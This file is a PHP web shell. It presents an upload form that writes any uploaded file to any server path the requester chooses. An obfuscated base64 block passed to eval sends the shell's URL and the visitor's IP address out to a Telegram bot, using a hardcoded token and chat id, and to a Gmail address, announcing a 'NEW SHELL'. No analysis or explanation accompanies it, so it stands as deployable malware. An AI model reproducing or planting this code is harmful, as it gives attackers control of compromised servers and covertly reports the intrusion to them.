<?php 
$str = 'U1RS';
echo base64_decode($str);
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}
echo '<html><head><title>STR</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));?>
